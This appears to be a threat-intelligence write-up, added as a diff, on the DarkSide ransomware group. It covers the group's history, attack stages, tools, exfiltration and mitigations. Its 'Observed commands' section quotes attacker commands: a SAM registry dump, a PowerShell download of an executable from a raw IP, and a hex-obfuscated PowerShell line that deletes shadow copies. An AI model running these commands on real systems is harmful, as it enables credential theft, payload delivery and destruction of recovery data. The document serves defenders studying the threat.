@@ -1,0 +1,111 @@
+DarkSide Ransomware :- 
+
+-> DarkSide Ransomware is a relatively new ransomware strain that threat actors have been using to target multiple large, high-revenue organizations resulting in the encryption and theft of sensitive data and threats to make it publicly available if the ransom demand is not paid. Because of its potential impact, we detail here the mechanisms used by the ransomware so that security teams can better assess their risk.
+
+About DarkSide Ransomware :-
+
+-> DarkSide is a relatively new ransomware group, which first appeared in August 2020 on one of the Russian language hacking forums where they were availing their ransomware to others groups. They are a new type of ransomware-as-a-service business, attempting to instill trust and reliability between themselves and their victims. The stealthy techniques followed by the threat actors ensure the attack tools and pattern would evade detection on the monitored system.
+
+-> The DarkSide group aggressively pressure the victims to pay the ransom amount. In short, they don’t like to be ignored. In case the victims do not reply within two or three days, they start to send threatening emails to employees. Even if that doesn’t work, they start calling senior executives on their mobile phones. The next course of action is to threaten the victim by saying that they would start to contact the victim’s customers or the press. And if that doesn’t work, they might launch DDoS to take down the whole external websites.
+
+-> DarkSide group techniques build on the typical pattern of a ransomware attack, which includes encrypting the files and demanding a ransom amount to decrypt them and restore access. It is obvious that some of the victims have already backed up their data, and they do not see a need to pay the ransom amount to get the decryption keys for restoration purposes. Darkside group is already prepared for that scenario and exfiltrate sensitive information and analyze the victim’s network so that they can up the amount if a victim refuses to pay it. Following that, they threaten to release the data publicly or launch a DDoS attack.
+
+-> DarkSide group also offers its RaaS to third parties for a percentage of the profits. They operate with a more advanced business model and identifies high-value targets, involving more precise monetization of the compromised assets. These attacks can be typically run by more than one group that collaborates and split profits. Following the above pointers, these look more like an APT (advanced persistent threat) attack than a traditional ransomware event.
+
+
+Detailed Timeline Of DarkSide Activity/Working :-
+
+1) August 2020: DarkSide ransomware was introduced.
+2) October 2020: DarkSide donates US$20,000 stolen from victims to various charities.
+3) November 2020: DarkSide establishes its RaaS business model. A data leak site is later discovered.
+4) November 2020: They launch their own content delivery network (CDN) for storing and delivering compromised data.
+5) December 2020: Media outlets and data recovery organizations are invited to follow the group’s press center on the public leak site.
+6) March 2021: The version 2.0 of its ransomware gets released.
+7) May 2021: DarkSide launches the Colonial Pipeline attack and announces it as apolitical.
+
+a) Attack Lifecycle :- 
+
+-> Based on various incidents observed, the threat actor used various publicly available and legitimate tools that are commonly utilized to ease various stages of the attack lifecycle in a post-exploitation ransomware attack. More details on the group are listed in the figure below.
+
+Darkside Ransomware Attack Lifecycle
+Image source: https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside/fig3b.png
+
+Figure 1: Observed TTPs for Darkside Ransomware
+
+b) Initial access :- 
+
+-> The various analyzed samples of DarkSide ransomware show that phishing, remote desktop protocol (RDP) abuse, and exploiting known vulnerabilities are the commonly used tactics by the group to gain initial access. DarkSide group also uses legitimate tools throughout the attack chain to remain obfuscate its attack and to remain undetected.
+
+Below is the comprehensive list of legitimate tools used by the group throughout the reconnaissance and gaining-entry phases of the attack:
+
+1) PowerShell: for reconnaissance and persistence
+2) Metasploit Framework: for reconnaissance
+3) Mimikatz: for reconnaissance
+4) BloodHound: for reconnaissance
+5)Cobalt Strike: for installation
+
+For a modern ransomware attack like the DarkSide, gaining initial access no longer immediately leads to ransomware being dropped onto the victim’s machine. There are now several steps that follow in between that are often manually executed by the threat actor.
+
+c) Lateral movement and privilege escalation :-
+
+-> Lateral movement is one of the key discovery phases in any modern ransomware process. The end goal is to identify all the critical data within the victim’s network, which includes the target files and locations to facilitate the upcoming exfiltration and encryption steps.
+
+-> In the case of DarkSide, the goal of lateral movement activity is to gain Domain Controller (DC) or Active Directory access, which will be further used to steal credentials, escalate privileges, and acquire other valuable assets for data exfiltration. The group laterally moves through the systems, eventually using the DC network share to deploy the ransomware to connected machines. As per the observation, the DarkSide group deployed PSExec and RDP.
+
+d) Exfiltration :-
+
+-> The critical files are exfiltrated before the ransomware is being launched. This is the riskiest step in the DarkSide ransomware execution process, as data exfiltration is more likely to be noticed by the victim organization’s cybersecurity team. It is the last step before any ransomware is dropped, and the attack often speeds up at this point to complete the process before it is detected and stopped.
+
+e) For exfiltration, these were the tools being used :-
+
+a) 7-Zip: a utility used for archiving files to prepare for exfiltration of critical data
+b) Rclone and Mega client: tools used for exfiltrating files to the cloud storage
+c) PuTTy: an alternative application used for network file transfer
+d) DarkSide uses several Tor-based leak sites to host victim’s stolen data. The file-sharing services used by the DarkSide group for data exfiltration include Mega and PrivatLab.
+
+f) Execution and impact :-
+
+-> The execution of the actual ransomware follows next. It is to be noted that the DarkSide ransomware shares many similarities with REvil in this step of the process, which includes the structure of ransom notes and the use of PowerShell to execute a command which eventually deletes shadow copies from the network. On code analysis, it was found that the same code checks were used by this ransomware to check whether the victim is located in a commonwealth of Independent States (CIS) country or not.
+
+-> The PowerShell is used to install and operate the malware itself, while Certutil and Bitsadmin were used to download the ransomware. Two encryption methods were used, depending on whether the target operating system is Windows or Linux: A ChaCha20 stream cipher with RSA-4096 is used on Linux, whereas Salsa20 with RSA-1024 is used on Windows.
+
+g) Mitigations :- 
+
+-> It is recommended to apply the following mitigations to reduce the risk of compromise by any ransomware attack.
+
+a) Enable multi-factor authentication for remote access to IT networks.
+b) Enable strong spam filters to prevent phishing emails from reaching end users’ mailboxes.
+c) Implement a user training and awareness program and simulated attacks for spear phishing to discourage users from visiting malicious websites or opening malicious attachments.
+d) Filter all network traffic to prohibit ingress and egress communications with known malicious IP addresses from threat intel.
+e) Regular patching activity for software, including operating systems, applications, and firmware on IT network assets. Consider using a centralized patch management system.
+f) Limit access to resources over networks, especially by restricting RDP access. If RDP is deemed to be necessarily used for business operations, restrict the originating source IP addresses and always require multi-factor authentication.
+g) Set anti-malware programs to conduct regular scans of IT network assets using up-to-date malware signatures.
+h) Disable macro scripts for Microsoft Office files transmitted via email.
+
+h) Domains :-
+
+1)temisleyes.com
+2)catsdegree.com
+3)securebestapp20.com
+4)baroquetees.com
+
+i) Observed commands :-
+
+C:\Windows\system32\reg.exe save HKLM\SAM sam.save
+powershell -Command “(New-Object Net.Webclient).DownloadFile(‘http://185.117.119.87/update.exe’,’C:\Windows\update.exe’)”
+Windows\System32\WindowsPowerShell\v1.0\powershell.exe , powershell -ep bypass -c “(0..61)|%{$s+=[char][byte] ‘0x’+’4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20’.
+Substring(2*$_,2))};iex $s”
+
+j) File Names :-
+
+1)Typed_history.zip
+2)Appdata.zip
+3)IE_Passwords.zip
+4)AD_intel
+5)ProcessExplorer.zip
+
+k) Conclusion :-
+
+-> It is to be noted that the ransomware groups are becoming increasingly professionalized, outsourcing code development, infrastructure and C2 operations, as well as operating RaaS business models. Many of them are organized enough to respond to media inquiries and operate victim hotlines.
+
+-> As these threat actors continue to evolve, the organizations are required to follow the security best practices to safeguard their critical business data and protect against groups such as the DarkSide ransomware gang. It is recommended to have an incident response plan kept in place in case of any such attacks.
